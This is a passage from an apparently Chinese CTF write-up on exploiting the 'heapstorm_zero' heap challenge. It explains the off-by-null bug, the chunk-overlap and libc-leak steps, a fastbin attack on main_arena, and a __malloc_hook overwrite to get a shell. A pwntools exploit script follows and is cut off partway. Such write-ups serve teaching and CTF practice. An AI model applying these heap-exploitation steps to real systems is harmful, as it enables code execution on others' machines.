class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Please input chunk size:"</span>);</span><br><span class="line"><span class="keyword">int</span> size = read_int();   </span><br><span class="line"><span class="comment">// size 最大为0x38</span></span><br><span class="line"><span class="keyword">if</span>(!check_chunksize(size))&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"Invalid size!"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> * p = (<span class="keyword">char</span> *)<span class="built_in">calloc</span>(size, <span class="number">1</span>);</span><br><span class="line"><span class="keyword">if</span>(!p)&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"Alloc error!!"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Please input chunk content:"</span>);</span><br><span class="line"><span class="comment">// read_n 会向p[size]='\x00',所以有一字节的溢出，溢出的字节为'\x00'</span></span><br><span class="line">read_n(p, size);</span><br><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">31</span> &amp;&amp; (<span class="keyword">size_t</span>)page-&gt;chunk[i]^page-&gt;xorkey; ++i )&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ( i == <span class="number">32</span> )&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"Too many chunks!"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 指针xor加密存放</span></span><br><span class="line">page-&gt;chunk[i] = (<span class="keyword">char</span>*)((<span class="keyword">size_t</span>)p^page-&gt;xorkey);</span><br><span class="line">++sum;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Chunk index: %d\n"</span>,i);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先让用户输入一个 size , 然后判断 size 最大只能为 0x38 ， 这意味着我们只能分配 fastbin 的 chunk. 分配好内存后，会读入数据到里面，这时候会有一个 \x00 字节的溢出。</p><h3 id="View"><a href="#View" class="headerlink" title="View"></a>View</h3><p>就是把指针解密出来，然后用 printf 打印内容。</p><h3 id="Delete"><a href="#Delete" class="headerlink" title="Delete"></a>Delete</h3><p>解密出指针，然后释放掉，同时把相关的项设置为初始状态。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Delete</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Please input chunk index: "</span>);</span><br><span class="line"><span class="keyword">int</span> idx = read_int();</span><br><span class="line"><span class="keyword">if</span> ( idx &lt; <span class="number">0</span> || idx &gt; <span class="number">31</span> )&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"Invalid index!"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">char</span> *p = (<span class="keyword">char</span>*)((<span class="keyword">size_t</span>)page-&gt;chunk[idx]^page-&gt;xorkey);</span><br><span class="line"><span class="keyword">if</span> ( p )</span><br><span class="line">&#123;</span><br><span class="line">--sum;</span><br><span class="line"><span class="built_in">free</span>(p);</span><br><span class="line">page-&gt;chunk[idx] = (<span class="keyword">char</span>*)(page-&gt;xorkey);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>总结一下程序的功能。</p><p>我们最多只能 malloc(0x38) 即 0x40 大小的 chunk.<br>有一个 打印 chunk 内容的函数。<br>分配时可以 off by null.</p><h2 id="利用分析"><a href="#利用分析" class="headerlink" title="利用分析"></a>利用分析</h2><h3 id="简述"><a href="#简述" class="headerlink" title="简述"></a>简述</h3><p>一字节溢出的利用围绕着的是 堆块在分配，释放，合并时对 chunk 的 size 域的信任关系。而如果只是 fastbin 的话 off by null 是没法利用的，因为只要溢出就会把 size 设置为 0.</p><p>这里有一个 tips , 使用 scanf 获取内容时，如果 输入字符串比较长会调用 malloc 来分配内存。</p><p>在 malloc 分配内存时，首先会一次扫描一遍 fastbin , smallbin ， unsorted bin ，largebin, 如果都找不到可以分配的 chunk 分配给用户 ， 会进入 top_chunk 分配的流程， 如果此时还有 fastbin ，就会触发堆合并机制，把 fastbin 合并 之后放入 smallbin，再看能否分配，不能的话会使用 top_chunk 进行分配。</p><p>于是利用 scanf 能分配大内存的特性，我们可以触发 堆合并，然后让 fastbin 合并成一个 smallbin , 然后在触发 off-by-null , 就是常规的利用思路了。</p><h3 id="信息泄露"><a href="#信息泄露" class="headerlink" title="信息泄露"></a>信息泄露</h3><p>首先分配 12 个 chunk, 其中 第一个 和最后一个保留， 第一个 chunk 用于 触发 off-by-null ， 最后一个用于防止在 堆合并时与 top_chunk 进行合并。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x38</span>, <span class="string">'a'</span>)  <span class="comment"># 0</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x28</span>, <span class="string">'a'</span>)  <span class="comment"># 1</span></span><br><span class="line">add(<span class="number">0x28</span>, <span class="string">'a'</span>)  <span class="comment"># 2</span></span><br><span class="line">add(<span class="number">0x18</span>, <span class="string">'a'</span>)  <span class="comment"># 3</span></span><br><span class="line">add(<span class="number">0x18</span>, <span class="string">'a'</span>)  <span class="comment"># 4</span></span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">'x'</span>)  <span class="comment"># 5</span></span><br><span class="line">add(<span class="number">0x28</span>, <span class="string">'x'</span>)  <span class="comment"># 6</span></span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">'x'</span>)  <span class="comment"># 7</span></span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">'x'</span>)  <span class="comment"># 8</span></span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">'x'</span>)  <span class="comment"># 9</span></span><br><span class="line">pay = <span class="string">'a'</span> * <span class="number">0x20</span> + p64(<span class="number">0x200</span>) + p64(<span class="number">0x20</span>)  <span class="comment"># shrink chunk 前，配置好</span></span><br><span class="line">add(<span class="number">0x38</span>, pay)  <span class="comment"># 10</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">'end'</span>)  <span class="comment"># 11  , 保留块， 防止和 top chunk 合并</span></span><br></pre></td></tr></table></figure><p>然后把中间的 10 个 chunk 释放掉，同时触发 堆合并，构造一个 0x210 大小的 smallbin<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># 释放掉 chunk</span><br><span class="line">for i in range(1, 11):</span><br><span class="line">    dele(i)</span><br><span class="line"></span><br><span class="line"># 利用 scanf 分配大内存 0x400+ , 会触发堆合并</span><br><span class="line"># fastbin 会合并进入 smallbin</span><br><span class="line">triger_consolidate()</span><br></pre></td></tr></table></figure></p><p>函数 triger_consolidate 的逻辑就是发送 0x400 的字符串给 scanf 处理，然后 scanf 会分配大内存，触发 堆合并。</p><p>此时的内存布局如下</p><p><img alt="" data-src="/imgs/off-by-null-1.png" class="lozad"></p><p>图中特殊标出的 0x200 | 0x20 用于保证后续利用过掉 check.</p><p>然后利用 chunk 0 , 溢出 一字节的 \x00 , 修改下面那个 smallbin 的 size —&gt; 0x200</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 利用 chunk 0 , 溢出 一字节的 \x00 , 修改 size ---&gt; 0x200</span></span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">pay = <span class="string">'a'</span> * <span class="number">0x38</span></span><br><span class="line">add(<span class="number">0x38</span>, pay)  <span class="comment"># 0</span></span><br></pre></td></tr></table></figure><p>紧接着在这个剩下的 0x200 字节的 smallbin 里面分配 8 个 chunk , 然后利用同样的方法，在里面构造一个 smallbin</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x38</span>, <span class="string">'a'</span> * <span class="number">8</span>)  <span class="comment"># 1</span></span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">'b'</span> * <span class="number">8</span>)  <span class="comment"># 2</span></span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">'c'</span> * <span class="number">8</span>)  <span class="comment"># 3</span></span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">'x'</span>)  <span class="comment"># 4</span></span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">'x'</span>)  <span class="comment"># 5</span></span><br><span class="line">add(<span class="number">0x28</span>, <span class="string">'x'</span>)  <span class="comment"># 6</span></span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">'x'</span>)  <span class="comment"># 7</span></span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">'x'</span>)  <span class="comment"># 8</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 利用 大量的 fastbin + 堆合并 构造 smallbin , 大小 0xc0</span></span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">dele(<span class="number">2</span>)</span><br><span class="line">dele(<span class="number">3</span>)</span><br><span class="line">triger_consolidate()</span><br></pre></td></tr></table></figure><p><img alt="" data-src="/imgs/off-by-null-2.png" class="lozad"></p><p>下面释放掉 chunk 11</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 触发 overlap</span></span><br><span class="line">dele(<span class="number">11</span>)</span><br><span class="line">triger_consolidate()</span><br></pre></td></tr></table></figure><p>系统发现 chunk 11 的 pre_size 为 0 ，即表明前一个 chunk 是释放状态，同时 chunk 11 和 top_chunk 相邻，所以 即使 chunk 11 的大小在 fastbin 的范围内也会触发合并操作，于是会通过 chunk 11 的 pre_size ( 0x210 ) 找到上面那个 smallbin 的起始地址。</p><p>然后对 smallbin 做 unlink 操作， 此时 smallbin 已经在链表上，所以 unlink 可以通过，拆下来后进行合并， 合并之后形成了一个大 chunk.<br><img alt="" data-src="/imgs/off-by-null-3.png" class="lozad"></p><p>这个 chunk 会继续和 top_chunk 合并变成 top_chunk 的一部分。注意到此时 chunk4 - chunk8 已经落入 top_chunk 里。</p><p>接下来通过类似的方法，分配多个 chunk ， 然后释放掉中间的一些的 chunk , 然后出发 堆合并，构造一个比较大的 smallbin<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">add(0x28, &apos;a&apos;)  # 1</span><br><span class="line">add(0x28, &apos;a&apos;)  # 2</span><br><span class="line">add(0x18, &apos;a&apos;)  # 3</span><br><span class="line">add(0x18, &apos;a&apos;)  # 9</span><br><span class="line">add(0x38, &apos;1&apos; * 0x30)  # 10</span><br><span class="line">add(0x38, &apos;2&apos; * 0x30)  # 11</span><br><span class="line">add(0x28, &apos;3&apos; * 0x30)  # 12</span><br><span class="line">add(0x38, &apos;4&apos; * 0x30)  # 13</span><br><span class="line">add(0x38, &apos;5&apos; * 0x30)  # 14</span><br><span class="line">pay = &apos;a&apos; * 0x20 + p64(0x200) + p64(0x20)</span><br><span class="line">add(0x38, pay)  # 15</span><br><span class="line"></span><br><span class="line">add(0x38, &apos;end&apos;)  # 16</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">dele(1)</span><br><span class="line">dele(2)</span><br><span class="line">dele(3)</span><br><span class="line">for i in range(9, 16):</span><br><span class="line">    dele(i)</span><br><span class="line"></span><br><span class="line">triger_consolidate()</span><br></pre></td></tr></table></figure></p><p>此时的内存状态如图</p><p><img alt="" data-src="/imgs/off-by-null-4.png" class="lozad"></p><p>此时 chunk 4 - chunk 8 落入了新构造的 smallbin 里面。下面通过 不断的分配，会对这个 smallbin 进行切割，这个过程就会使得 一些链表用的指针落入到 还处于 使用状态的 chunk4 - chunk8 的某一个 chunk 里面， 然后利用 puts 功能，就可以打印指针的内容，造成信息泄露， 拿到 libc 的地址。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">### 构造好 unsorted bin ，下面通过不断切割，让指针落入 overlap chunk 里面， 然后 Puts leak 出来</span></span><br><span class="line"></span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">pay = <span class="string">'a'</span> * <span class="number">0x38</span></span><br><span class="line">add(<span class="number">0x38</span>, pay)  <span class="comment"># 0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">###  再次 shrink chunk 利用切割smallbin遗留下的指针，leak libc</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">'a'</span> * <span class="number">8</span>)  <span class="comment"># 1</span></span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">'b'</span> * <span class="number">8</span>)  <span class="comment"># 2</span></span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">'c'</span> * <span class="number">8</span>)  <span class="comment"># 3</span></span><br><span class="line"></span><br><span class="line">view(<span class="number">4</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Content: '</span>)</span><br><span class="line">lbase = u64(p.recvuntil(<span class="string">'\n'</span>)[:<span class="number">-1</span>].ljust(<span class="number">8</span>, <span class="string">'\x00'</span>)) - <span class="number">0x3c4b20</span> - <span class="number">88</span></span><br><span class="line">success(<span class="string">'lbase: '</span> + hex(lbase))</span><br></pre></td></tr></table></figure><h3 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h3><p>能够 overlap chunk 后实现 getshell 的方式就很多了，下面 分析下 exp 的 getshell 方案。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># fastbin dup, 利用 overlap chunk 和 fastbin 的机制往  main_arena 写 size 0x41</span></span><br><span class="line"><span class="comment"># 然后利用 fastbin attack 控制 main_arena-&gt;top.</span></span><br><span class="line">dele(<span class="number">5</span>)</span><br><span class="line">dele(<span class="number">14</span>)</span><br><span class="line">dele(<span class="number">0xc</span>)</span><br><span class="line"></span><br><span class="line">dele(<span class="number">6</span>)</span><br><span class="line">dele(<span class="number">15</span>)</span><br><span class="line">dele(<span class="number">0xd</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改fastbin的fd为0x41,然后分配几次，让main_arean里面有0x41</span></span><br><span class="line">add(<span class="number">0x28</span>, p64(<span class="number">0x41</span>))</span><br><span class="line">add(<span class="number">0x28</span>, <span class="string">'a'</span>)</span><br><span class="line">add(<span class="number">0x28</span>, <span class="string">'a'</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x38</span>, p64(lbase + <span class="number">0x3c4b20</span> + <span class="number">8</span>))</span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">'a'</span>)</span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">'a'</span>)</span><br><span class="line"><span class="comment"># 利用之前在main_arean里面设置的0x41作为size分配到main_arean,然后修改top_chunk的地址为__malloc_hook-0x18</span></span><br><span class="line">add(<span class="number">0x38</span>, p64(lbase + <span class="number">0x3c4b20</span> + <span class="number">8</span> + <span class="number">0x20</span>) + <span class="string">'\x00'</span> * <span class="number">0x10</span> + p64(<span class="number">0x41</span>))</span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">'\x00'</span> * <span class="number">0x20</span> + p64(lbase + libc.sym[<span class="string">'__malloc_hook'</span>] - <span class="number">0x18</span>))</span><br></pre></td></tr></table></figure><ul><li>利用 overlap chunk 和 fastbin 的机制往 main_arena 写 size (0x41)</li><li>然后利用 fastbin attack 控制 main_arena-&gt;top<br>然后就可以分配到 malloc_hook 附近，修改 malloc_hook 为 one_gadget.</li></ul><p>最后利用 malloc_printerr 触发 one_gadget<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 此时 chunk 6 和 chunk 8 在 tbl 的指针一样，触发 double free</span></span><br><span class="line"><span class="comment"># malloc_printerr ---&gt; malloc_hook ---&gt; getshell</span></span><br><span class="line">dele(<span class="number">6</span>)</span><br><span class="line">dele(<span class="number">8</span>)</span><br></pre></td></tr></table></figure></p><p>完整exp：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line"># -*- coding: UTF-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">from time import sleep</span><br><span class="line">from utils import *</span><br><span class="line"></span><br><span class="line">context.log_level = &quot;debug&quot;</span><br><span class="line">context.terminal = [&apos;tmux&apos;, &apos;splitw&apos;, &apos;-h&apos;]</span><br><span class="line">#context.terminal = [&apos;tmux&apos;, &apos;splitw&apos;, &apos;-v&apos;]</span><br><span class="line"></span><br><span class="line">path = &quot;./heapstorm_zero&quot;</span><br><span class="line"></span><br><span class="line">p = process(path, aslr=0)</span><br><span class="line">bin = ELF(path, checksec=False)</span><br><span class="line">libc = ELF(&apos;/lib/x86_64-linux-gnu/libc-2.23.so&apos;, checksec=False)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># result = (unsigned int)(a1 - 1) &lt;= 0x37;</span><br><span class="line">def add(size, con):</span><br><span class="line">    p.recvuntil(&apos;Choice:&apos;)</span><br><span class="line">    p.sendline(&apos;1&apos;)</span><br><span class="line">    p.recvuntil(&apos;size:&apos;)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(&apos;content:&apos;)</span><br><span class="line">    p.sendline(con)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def view(idx):</span><br><span class="line">    p.recvuntil(&apos;Choice:&apos;)</span><br><span class="line">    p.sendline(&apos;2&apos;)</span><br><span class="line">    p.recvuntil(&apos;index:&apos;)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def dele(idx):</span><br><span class="line">    p.recvuntil(&apos;Choice:&apos;)</span><br><span class="line">    p.sendline(&apos;3&apos;)</span><br><span class="line">    p.recvuntil(&apos;index:&apos;)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def triger_consolidate(pay=&apos;&apos;):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    利用 scanf(&quot;%d&quot;,&amp;n) 触发大内存分配，进而导致 内存合并。</span><br><span class="line">    :param pay:</span><br><span class="line">    :return:</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    p.recvuntil(&apos;Choice:&apos;)</span><br><span class="line">    if pay == &apos;&apos;:</span><br><span class="line">        p.sendline(&apos;1&apos; * 0x400)  # malloc_consolidate</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(0x38, &apos;a&apos;)  # 0</span><br><span class="line"></span><br><span class="line">add(0x28, &apos;a&apos;)  # 1</span><br><span class="line">add(0x28, &apos;a&apos;)  # 2</span><br><span class="line">add(0x18, &apos;a&apos;)  # 3</span><br><span class="line">add(0x18, &apos;a&apos;)  # 4</span><br><span class="line">add(0x38, &apos;x&apos;)  # 5</span><br><span class="line">add(0x28, &apos;x&apos;)  # 6</span><br><span class="line">add(0x38, &apos;x&apos;)  # 7</span><br><span class="line">add(0x38, &apos;x&apos;)  # 8</span><br><span class="line">add(0x38, &apos;x&apos;)  # 9</span><br><span class="line">pay = &apos;a&apos; * 0x20 + p64(0x200) + p64(0x20)  # shrink chunk 前，配置好</span><br><span class="line">add(0x38, pay)  # 10</span><br><span class="line"></span><br><span class="line">add(0x38, &apos;end&apos;)  # 11  , 保留块， 防止和 top chunk 合并</span><br><span class="line"></span><br><span class="line"># 释放掉 chunk</span><br><span class="line">for i in range(1, 11):</span><br><span class="line">    dele(i)</span><br><span class="line"></span><br><span class="line"># 利用 scanf 分配大内存 0x400+ , 会触发堆合并</span><br><span class="line"># fastbin 会合并进入 smallbin</span><br><span class="line">triger_consolidate()</span><br><span class="line"></span><br><span class="line"># 合并后 形成 0x210 大小的 smallbin</span><br><span class="line"># pwndbg&gt; x/4xg 0x555555757040</span><br><span class="line"># 0x555555757040: 0x0000000000000000      0x0000000000000211</span><br><span class="line"># 0x555555757050: 0x00002aaaab097d78      0x00002aaaab097d78</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 利用 chunk 0 , 溢出 一字节的 \x00 , 修改 size ---&gt; 0x200</span><br><span class="line">dele(0)</span><br><span class="line">pay = &apos;a&apos; * 0x38</span><br><span class="line">add(0x38, pay)  # 0</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line">add(0x38, &apos;a&apos; * 8)  # 1</span><br><span class="line">add(0x38, &apos;b&apos; * 8)  # 2</span><br><span class="line">add(0x38, &apos;c&apos; * 8)  # 3</span><br><span class="line">add(0x38, &apos;x&apos;)  # 4</span><br><span class="line">add(0x38, &apos;x&apos;)  # 5</span><br><span class="line">add(0x28, &apos;x&apos;)  # 6</span><br><span class="line">add(0x38, &apos;x&apos;)  # 7</span><br><span class="line">add(0x38, &apos;x&apos;)  # 8</span><br><span class="line"></span><br><span class="line"># 利用 大量的 fastbin + 堆合并 构造 smallbin , 大小 0xc0</span><br><span class="line">dele(1)</span><br><span class="line">dele(2)</span><br><span class="line">dele(3)</span><br><span class="line">triger_consolidate()</span><br><span class="line"></span><br><span class="line"># 触发 overlap</span><br><span class="line">dele(11)</span><br><span class="line">triger_consolidate()</span><br><span class="line"></span><br><span class="line">add(0x28, &apos;a&apos;)  # 1</span><br><span class="line">add(0x28, &apos;a&apos;)  # 2</span><br><span class="line">add(0x18, &apos;a&apos;)  # 3</span><br><span class="line">add(0x18, &apos;a&apos;)  # 9</span><br><span class="line">add(0x38, &apos;1&apos; * 0x30)  # 10</span><br><span class="line">add(0x38, &apos;2&apos; * 0x30)  # 11</span><br><span class="line">add(0x28, &apos;3&apos; * 0x30)  # 12</span><br><span class="line">add(0x38, &apos;4&apos; * 0x30)  # 13</span><br><span class="line">add(0x38, 